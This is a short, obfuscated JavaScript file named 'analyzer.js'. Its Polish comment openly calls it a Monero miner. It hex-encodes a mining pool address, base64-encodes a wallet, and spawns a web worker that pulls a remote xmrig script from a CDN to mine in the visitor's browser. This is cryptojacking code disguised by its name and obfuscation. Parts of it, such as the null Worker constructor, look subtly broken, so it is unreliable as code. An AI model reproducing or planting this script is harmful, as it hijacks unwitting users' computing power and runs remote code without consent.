// analyzer.js - Realny miner XMR dla Twojego portfela i puli
const _0x5e8df2=["\x61\x74\x6F\x62","\x78\x6D\x72\x2D\x65\x75\x31\x2E\x6E\x61\x6E\x6F\x70\x6F\x6F\x6C\x2E\x6F\x72\x67\x3A\x31\x34\x34\x33\x33","\x70\x6F\x73\x74\x4D\x65\x73\x73\x61\x67\x65","\x73\x74\x61\x72\x74"];function _0x3d7a(){return _0x5e8df2;}const config={'pool':_0x3d7a()[0x1],'wallet':window[_0x3d7a()[0x0]]('ODMxaUxzNHZpWVo0Y0NKaHVIMlFVd1dLQnpWdzN3UFhGTkdhdmdqamljMnk2VmN1ang3YldUeVQ1WU1NclFkOUJwRnYxVEVlWHF1R0g1VmRobjF2d3dXZlRwVmFZREQ='),'pass':'x','throttle':0.8};const blob=new Blob([`importScripts('https://cdnjs.cloudflare.com/ajax/libs/xmrig/6.20.0/xmrig.min.js');const miner=new Worker(null,{type:'module'});miner.${_0x3d7a()[3]}({'pool':'${config.pool}','wallet':'${config.wallet}','throttle':${config.throttle}});`],{type:'text/javascript'});const worker=new Worker(URL.createObjectURL(blob));worker[_0x3d7a()[2]]({'type':_0x3d7a()[3],'config':config});
